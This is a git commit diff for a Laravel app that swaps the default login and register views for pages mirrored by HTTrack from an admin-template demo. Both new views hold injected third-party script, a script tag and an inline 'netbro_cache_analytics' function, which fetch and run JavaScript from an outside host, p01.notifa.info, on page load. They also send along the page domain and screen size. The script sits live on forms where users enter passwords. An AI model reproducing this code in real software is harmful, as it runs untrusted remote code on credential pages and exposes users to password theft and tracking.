a2f24edf8bc0c90b491f5be23c6b04d356fb4a47
AhmadSuherman <suhermana274@gmail.com>
2020-09-16 14:11:53 +0700

    [W] Mengubah Tampilan Login dan Register

--- resources/views/auth/login.blade.php
+++ resources/views/auth/login.blade.php
@@ -1,79 +1,123 @@
-@extends('layouts.app')
+<html lang="en"><!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:47 GMT --><head>
+    <meta charset="UTF-8">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->
 
-@section('content')
-<div class="container">
-    <div class="row justify-content-center">
-        <div class="col-md-8">
-            <div class="card">
-                <div class="card-header">{{ __('Login') }}</div>
+    <!-- Title -->
+    <title>Cuyang - Login</title>
 
-                <div class="card-body">
-                    <form method="POST" action="{{ route('login') }}">
-                        @csrf
+    <!-- Favicon -->
+    <link rel="icon" href="{{ asset('img/core-img/favicon.png') }}">
 
-                        <div class="form-group row">
-                            <label for="email" class="col-md-4 col-form-label text-md-right">{{ __('E-Mail Address') }}</label>
+    <!-- Master Stylesheet [If you remove this CSS file, your file will be broken undoubtedly.] -->
+    <link rel="stylesheet" href="{{ asset('style.css') }}">
 
-                            <div class="col-md-6">
-                                <input id="email" type="email" class="form-control @error('email') is-invalid @enderror" name="email" value="{{ old('email') }}" required autocomplete="email" autofocus>
+<script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtReml7H46z9E2%2fdugczn8qHo5CLM2PsXgK%2bOvNwL%2fFMhPzFTMt%2braGZq8FfhGCUEIzi2NSSH0ffFExXw20fGTfvdZI8JhVVxw8WZIuqPew6iSyoLAUjb0den9SPHzD%2f24Wm8EGz9B0gGmq5onkuEEgRwV2VTMXsQ5t1S3th06Y9q6%2fjX8cQWeZzwW223dG5yzjx1a3u1R9%2b6mE9cqCLW7dfoGWf5nzQ0rCusTicrE6F2yOc1z5%2fm35CvqEP1s6wvuSJ%2bg9rVymOroQDKRBvVL4Nl3tmAvjCAF5oR&amp;idc_r=89706268517&amp;domain=localhost&amp;sw=1366&amp;sh=768"></script></head>
 
-                                @error('email')
-                                    <span class="invalid-feedback" role="alert">
-                                        <strong>{{ $message }}</strong>
-                                    </span>
-                                @enderror
-                            </div>
-                        </div>
+<body class="dark-color-overlay bg-img" style="background-image: url(img/bg-img/8.jpg);">
 
-                        <div class="form-group row">
-                            <label for="password" class="col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>
+    <!-- Preloader -->
+    
 
-                            <div class="col-md-6">
-                                <input id="password" type="password" class="form-control @error('password') is-invalid @enderror" name="password" required autocomplete="current-password">
+    <!-- ======================================
+    ******* Page Wrapper Area Start **********
+    ======================================= -->
+    <div class="main-content- h-100vh">
+        <div class="container h-100">
+            <div class="row h-100 align-items-center justify-content-center">
+                <div class="col-sm-10 col-lg-8">
+                    <!-- Middle Box -->
+                    <div class="middle-box">
+                        <div class="card mb-0">
+                            <div class="card-body p-4">
+                                <div class="row align-items-center">
+                                    <div class="col-md-6">
+                                        <div class="xs-d-none">
+                                            <img src="{{ url('img/bg-img/6.png')}}" alt="">
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="col-md-6">
+                                        <!-- Logo -->
+                                        <div class="card-body-login mb-30">
+                                            <img src="img/core-img/logo.png" alt="">
+                                        </div>
 
-                                @error('password')
-                                    <span class="invalid-feedback" role="alert">
-                                        <strong>{{ $message }}</strong>
-                                    </span>
-                                @enderror
-                            </div>
-                        </div>
+                                        <h4 class="font-22 mb-30">Sign In</h4>
 
-                        <div class="form-group row">
-                            <div class="col-md-6 offset-md-4">
-                                <div class="form-check">
-                                    <input class="form-check-input" type="checkbox" name="remember" id="remember" {{ old('remember') ? 'checked' : '' }}>
+                                        <form action="{{ route('login') }}" method="POST">
+                                            @csrf
+                                            <div class="form-group">
+                                                <label class="float-left" for="emailaddress">Email</label>
+                                                <input class="form-control" name="email" type="email" id="emailaddress"  placeholder="Masukan Email Anda">
+                                                <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
+                                                 @error('email')
+                                                    <p>
+                                                        {{ $message }}
+                                                    </p>
+                                                @enderror
+                                            </div>
 
-                                    <label class="form-check-label" for="remember">
-                                        {{ __('Remember Me') }}
-                                    </label>
+                                            <div class="form-group">
+                                                
+                                                <label class="float-left" for="password">Password</label>
+                                                <input class="form-control" name="password" type="password" id="password" placeholder="Masukan Password Anda">
+                                               <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
+                                                 @error('password')
+                                                    <p>
+                                                        {{ $message }}
+                                                    </p>
+                                                @enderror
+
+                                               <!--  <a href="forget-password.html" class="text-dark float-right"><span class="font-12 text-primary">Lupa password?</span></a> -->
+                                            </div>
+
+                                            <div>
+                                                <label>Belum Punya Akun?</label><a href="{{  route('register') }}"> Register</a>
+                                            </div>
+
+                                            <div class="form-group mb-3">
+                                                <div class="custom-control custom-checkbox pl-0">
+                                                    <div class="custom-control custom-checkbox">
+                                                        <input type="checkbox" class="custom-control-input" id="customCheck1">
+                                                        <label class="custom-control-label" for="customCheck1"><span class="font-16">Remember me</span></label>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <div class="form-group mb-0 text-center">
+                                                <button class="btn btn-primary btn-block" type="submit"> Log In </button>
+                                            </div>
+
+                                        </form>
+                                    </div> <!-- end card-body -->
                                 </div>
+                                <!-- end card -->
                             </div>
                         </div>
-
-                        <div class="form-group row mb-0">
-                            <div class="col-md-8 offset-md-4">
-                                <button onclick="sweetalertclick()" type="submit" class="btn btn-primary">
-                                    {{ __('Login') }}
-                                </button>
-
-                                @if (Route::has('password.request'))
-                                    <a class="btn btn-link" href="{{ route('password.request') }}">
-                                        {{ __('Forgot Your Password?') }}
-                                    </a>
-                                @endif
-                            </div>
-                        </div>
-                    </form>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
-</div>
-@endsection
 
-<script>
-    function sweetalertclick(){
-        swal('Hello word')
-    }
-</script>
+    <!-- ======================================
+    ********* Page Wrapper Area End ***********
+    ======================================= -->
+
+    <!-- Must needed plugins to the run this Template -->
+    <script src="{{ asset('js/jquery.min.js') }}"></script>
+    <script src="{{ asset('js/popper.min.js') }}"></script>
+    <script src="{{ asset('js/bootstrap.min.js') }}"></script>
+    <script src="{{ asset('js/bundle.js') }}"></script>
+
+    <!-- Active JS -->
+    <script src="js/default-assets/active.js"></script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtReml7H46z9E2%2fdugczn8qHo5CLM2PsXgK%2bOvNwL%2fFMhPzFTMt%2braGZq8FfhGCUEIzi2NSSH0ffFExXw20fGTfvdZI8JhVVxw8WZIuqPew6iSyoLAUjb0den9SPHzD%2f24Wm8EGz9B0gGmq5onkuEEgRwV2VTMXsQ5t1S3th06Y9q6%2fjX8cQWeZzwW223dG5yzjx1a3u1R9%2b6mE9cqCLW7dfoGWf5nzQ0rCusTicrE6F2yOc1z5%2fm35CvqEP1s6wvuSJ%2bg9rVymOroQDKRBvVL4Nl3tmAvjCAF5oR" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
+
+<!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:49 GMT -->
+</body></html>
--- resources/views/auth/register.blade.php
+++ resources/views/auth/register.blade.php
@@ -1,77 +1,132 @@
-@extends('layouts.app')
+<html lang="en"><!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/register.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:49 GMT --><head>
+    <meta charset="UTF-8">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->
 
-@section('content')
-<div class="container">
-    <div class="row justify-content-center">
-        <div class="col-md-8">
-            <div class="card">
-                <div class="card-header">{{ __('Register') }}</div>
+    <!-- Title -->
+    <title>Undex - Modern Admin Template</title>
 
-                <div class="card-body">
-                    <form method="POST" action="{{ route('register') }}">
-                        @csrf
+    <!-- Favicon -->
+    <link rel="icon" href="{{ asset('/img/core-img/favicon.png')}}">
 
-                        <div class="form-group row">
-                            <label for="name" class="col-md-4 col-form-label text-md-right">{{ __('Name') }}</label>
+    <!-- Master Stylesheet [If you remove this CSS file, your file will be broken undoubtedly.] -->
+    <link rel="stylesheet" href="{{ asset('style.css')}}">
 
-                            <div class="col-md-6">
-                                <input id="name" type="text" class="form-control @error('name') is-invalid @enderror" name="name" value="{{ old('name') }}" required autocomplete="name" autofocus>
+<script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtRemL63VQuxIGwWvWJHs8bqBGoGM7%2fBsPHSF0fW4SR2I783XVC8Xh4LE%2b4eFh5hvzfDO2%2foTRBa8YstDkY3FW4SovUd2tOEMFJx5YaqsgM%2bfoP1iBLtanWbBa4N1W1IkAYwzKYoxQmgI%2b8tDjucXydRGFe4ISgBAXkScJX99yZDvaNYGIP4NFcGRXyjRbe%2b0KeEna2eELtKFOJIPjXNtfLhKLJJKCW%2fg4WxwrTa3K3YfZUqs81gySOiD0qZOdcsFLLO%2bx4eueteWbNfHmYpSjbmGsc7teoPoGVk8&amp;idc_r=35114405284&amp;domain=localhost&amp;sw=1366&amp;sh=768"></script></head>
 
-                                @error('name')
-                                    <span class="invalid-feedback" role="alert">
-                                        <strong>{{ $message }}</strong>
-                                    </span>
-                                @enderror
+<body class="dark-color-overlay bg-img" style="background-image: url(img/bg-img/8.jpg);">
+    <!-- Preloader -->
+    
+
+    <!-- ======================================
+    ******* Main Wrapper Area Start **********
+    ======================================= -->
+    <div class="main-content- h-100vh">
+        <div class="container h-100">
+            <div class="row h-100 justify-content-center align-items-center">
+                <div class="col-sm-10 col-md-12 col-lg-9">
+                    <!-- Middle Box -->
+                    <div class="middle-box">
+                        <div class="card mb-0">
+                            <div class="card-body p-4">
+                                <div class="row align-items-center">
+                                    <div class="col-md-6">
+                                        <div class="xs-d-none">
+                                            <img src="{{ asset('img/bg-img/6.png')}}" alt="">
+                                        </div>
+                                    </div>
+
+                                    <div class="col-md-6">
+
+                                        <div>
+                                            <h4 class="font-24 mt-0">Sign Up</h4>
+                                            <p class="text-muted mb-4">Create a new account</p>
+                                        </div>
+
+                                        <form method="post" action="{{ route('register') }}">
+                                            @csrf
+                                            <div class="form-group">
+                                                <label for="fullname">Nama Lengkap </label>
+                                                <input id="name" type="text" class="form-control @error('name') is-invalid @enderror" name="name" value="{{ old('name') }}" autocomplete="name" autofocus>
+                                                @error('name')
+                                                    <span class="invalid-feedback" role="alert">
+                                                        <strong>{{ $message }}</strong>
+                                                    </span>
+                                                @enderror
+                                            </div>
+
+                                            <div class="form-group">
+                                                <label for="emailaddress">Email</label>
+                                                <input id="email" type="email" class="form-control @error('email') is-invalid @enderror" name="email" value="{{ old('email') }}" autocomplete="email">
+
+                                                @error('email')
+                                                    <span class="invalid-feedback" role="alert">
+                                                        <strong>{{ $message }}</strong>
+                                                    </span>
+                                                @enderror
+                                            </div>
+
+                                            <div class="form-group">
+                                                <label for="password">Password</label>
+                                                <input id="password" type="password" class="form-control @error('password') is-invalid @enderror" name="password" autocomplete="new-password">
+
+                                                @error('password')
+                                                    <span class="invalid-feedback" role="alert">
+                                                        <strong>{{ $message }}</strong>
+                                                    </span>
+                                                @enderror
+                                            </div>
+
+                                            <div class="form-group">
+                                                <label for="password">Ulangi Password</label>
+                                                <input id="password-confirm" type="password" class="form-control" name="password_confirmation"  autocomplete="new-password">
+                                            </div>
+
+                                            <div>
+                                                <label>Sudah Punya Akun?</label><a href="{{  route('login') }}"> Login</a>
+                                            </div>
+
+                                             <div class="form-group mb-3">
+                                                <div class="custom-control custom-checkbox pl-0">
+                                                    <div class="custom-control custom-checkbox">
+                                                        <input type="checkbox" class="custom-control-input" id="customCheck1">
+                                                        <label class="custom-control-label" for="customCheck1"><span class="font-16">Remember me</span><a class="text-muted"> Terms and Conditions</a></label>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <div class="form-group mb-0 text-center">
+                                                <button class="btn btn-primary btn-block" type="submit"> Sign Up </button>
+                                            </div>
+
+                                        </form>
+                                    </div>
+                                </div>
                             </div>
                         </div>
-
-                        <div class="form-group row">
-                            <label for="email" class="col-md-4 col-form-label text-md-right">{{ __('E-Mail Address') }}</label>
-
-                            <div class="col-md-6">
-                                <input id="email" type="email" class="form-control @error('email') is-invalid @enderror" name="email" value="{{ old('email') }}" required autocomplete="email">
-
-                                @error('email')
-                                    <span class="invalid-feedback" role="alert">
-                                        <strong>{{ $message }}</strong>
-                                    </span>
-                                @enderror
-                            </div>
-                        </div>
-
-                        <div class="form-group row">
-                            <label for="password" class="col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>
-
-                            <div class="col-md-6">
-                                <input id="password" type="password" class="form-control @error('password') is-invalid @enderror" name="password" required autocomplete="new-password">
-
-                                @error('password')
-                                    <span class="invalid-feedback" role="alert">
-                                        <strong>{{ $message }}</strong>
-                                    </span>
-                                @enderror
-                            </div>
-                        </div>
-
-                        <div class="form-group row">
-                            <label for="password-confirm" class="col-md-4 col-form-label text-md-right">{{ __('Confirm Password') }}</label>
-
-                            <div class="col-md-6">
-                                <input id="password-confirm" type="password" class="form-control" name="password_confirmation" required autocomplete="new-password">
-                            </div>
-                        </div>
-
-                        <div class="form-group row mb-0">
-                            <div class="col-md-6 offset-md-4">
-                                <button type="submit" class="btn btn-primary">
-                                    {{ __('Register') }}
-                                </button>
-                            </div>
-                        </div>
-                    </form>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
-</div>
-@endsection
+
+    <!-- ======================================
+    ********* Page Wrapper Area End ***********
+    ======================================= -->
+
+    <!-- Must needed plugins to the run this template -->
+    <script src="{{ asset('js/jquery.min.js') }}"></script>
+    <script src="{{ asset('js/popper.min.js') }}"></script>
+    <script src="{{ asset('js/bootstrap.min.js') }}"></script>
+    <script src="{{ asset('js/bundle.js') }}"></script>
+
+    <!-- Active JS -->
+    <script src="{{ asset('js/default-assets/active.js') }}"></script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtRemL63VQuxIGwWvWJHs8bqBGoGM7%2fBsPHSF0fW4SR2I783XVC8Xh4LE%2b4eFh5hvzfDO2%2foTRBa8YstDkY3FW4SovUd2tOEMFJx5YaqsgM%2bfoP1iBLtanWbBa4N1W1IkAYwzKYoxQmgI%2b8tDjucXydRGFe4ISgBAXkScJX99yZDvaNYGIP4NFcGRXyjRbe%2b0KeEna2eELtKFOJIPjXNtfLhKLJJKCW%2fg4WxwrTa3K3YfZUqs81gySOiD0qZOdcsFLLO%2bx4eueteWbNfHmYpSjbmGsc7teoPoGVk8" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
+
+<!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/register.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:49 GMT -->
+</body></html>
